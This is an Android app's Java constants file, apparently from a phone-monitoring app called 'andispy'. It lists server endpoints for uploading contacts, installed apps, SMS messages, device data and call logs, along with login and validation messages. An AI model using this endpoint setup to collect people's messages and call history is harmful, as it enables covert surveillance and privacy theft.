package com.andispy.andispy.util;

import java.util.Arrays;
import java.util.List;

public interface Constants {
	
public final String DOMAIN = "http://andispy.grassobot.com/";
		
	public final String URL_reg = DOMAIN + "regandispy.php?";
	public final String URL_login = DOMAIN + "loginandispy.php?";
	public final String URL_Contact = DOMAIN + "contactandispy.php?";
	public final String URL_Application = DOMAIN + "appandispy.php?";
	public final String URL_Message = DOMAIN + "smsandispy.php?";
	public final String URL_Device = DOMAIN + "deviceandispy.php?";
	public final String URL_CallLog = DOMAIN + "calllogandispy.php?";

	/**
	 * Alert Dialog messages
	 */
	
	public final String MSG_TITLE_ERROR = "Error";
	public final String MSG_TITLE_SUCCESS = "Success";
	public final String MSG_CONNECTION_ERROR = "Unable to access server. Please check your Internet Connection";
	public final String MSG_EMAIL = "Please select valid Email & Password";	
	public final String MSG_REGIS_SUCCESS = "Registered Successfully.";
	public final String MSG_LOGIN_SUCCESS = "Login Successfully.";
	public final String MSG_LOGIN_ERROR = "User Name Or Password Invalid";
	
	public final String MSG_VALID_NAME = "Please Enter valid User Name";
	public final String MSG_VALID_EMAIL = "Please Enter valid Email Address";
	public final String MSG_VALID_PHONE_NO = "Please Enter valid Mobile Number";
	public final String MSG_VALID_PASSWORD = "Please Enter valid Password";
	public final String MSG_VALID_REPASSWORD = "Please Enter valid RePassword";

	
}
